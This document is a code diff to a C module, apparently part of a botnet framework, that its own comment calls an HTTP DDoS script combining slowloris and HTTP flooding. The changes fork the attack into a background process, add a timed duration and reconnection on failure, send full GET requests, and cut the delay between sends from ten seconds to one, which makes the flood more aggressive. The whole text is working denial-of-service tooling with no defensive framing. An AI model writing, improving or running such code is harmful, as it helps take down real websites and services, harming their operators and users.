@@ -1,3 +1,4 @@
+#include <time.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -9,9 +10,10 @@
 /* HTTP DDoS script developed as a mix of slowloris,
     http flood, HTTP Randomized User-Agent Flood */
 #include <dict.h>
+#include <command.h>
 
 #define CONNECTIONS 200
-#define SLEEP_TIME 10 // seconds delay
+#define SLEEP_TIME 1 // seconds delay
 
 int sockets[CONNECTIONS];
 
@@ -55,20 +57,65 @@ void setup_connection(int index, char *target_ip, int target_port)
 
 void start_httplankton_attack(char *target_ip, int target_port, int duration)
 {
+    pid_t httplankton_pid = fork();
+
+    if (httplankton_pid < 0)
+    {
 #ifdef DEBUG
-    printf("[HTTPlankton] Starting HTTPlankton attack %s:%d\n", target_ip, target_port);
+        printf("[HTTPlankton] Error during fork\n");
+#endif
+        return;
+    }
+
+    if (httplankton_pid != 0)
+    {
+#ifdef DEBUG
+        printf("[HTTPlankton] HTTP Attack started with process ID: %d\n", httplankton_pid);
+#endif
+        return;
+    }
+
+    int duration_seconds = duration * 60; // Convert minutes to seconds
+    time_t start = time(NULL);
+
+#ifdef DEBUG
+    printf("[HTTPlankton] Starting HTTPlankton attack on %s:%d for %d minutes\n", target_ip, target_port, duration);
 #endif
 
     for (int i = 0; i < CONNECTIONS; i++)
     {
+        sockets[i] = -1;
         setup_connection(i, target_ip, target_port);
+
+        if (sockets[i] == -1) 
+        {
+#ifdef DEBUG
+            printf("[HTTPlankton] Failed to setup connection %d\n", i);
+#endif
+            exit(1); 
+        }
     }
 
-    while (1) //TODO attack stop after duration expired
+    while (time(NULL) - start < duration_seconds)
     {
         for (int i = 0; i < CONNECTIONS; i++)
         {
-            if (send(sockets[i], "X-a: b\r\n", 9, 0) < 0)
+            if (sockets[i] < 0)
+            {
+                close(sockets[i]);
+                setup_connection(i, target_ip, target_port);
+
+                if (sockets[i] < 0) 
+                {
+#ifdef DEBUG
+                    printf("[HTTPlankton] Connection %d failed again\n", i);
+#endif
+                    exit(1);
+                }
+            }
+
+            const char *request = "GET / HTTP/1.1\r\nHost: target\r\nX-a: b\r\n\r\n";
+            if (send(sockets[i], request, strlen(request), 0) < 0)
             {
                 close(sockets[i]);
                 setup_connection(i, target_ip, target_port);
@@ -76,10 +123,22 @@ void start_httplankton_attack(char *target_ip, int target_port, int duration)
         }
 
 #ifdef DEBUG
-        printf("[HTTPlankton] Still active connections...\n");
+        printf("[HTTPlankton] Active connections... Continuing attack\n");
 #endif
-        sleep(SLEEP_TIME);
+
+        sleep(SLEEP_TIME); 
+    }
+
+#ifdef DEBUG
+    printf("[HTTPlankton] Attack terminated after %d %s\n", 
+        duration, duration > 1 ? "minutes" : "minute");
+#endif
+
+    for (int i = 0; i < CONNECTIONS; i++)
+    {
+        close(sockets[i]);
     }
 
     return;
 }
+
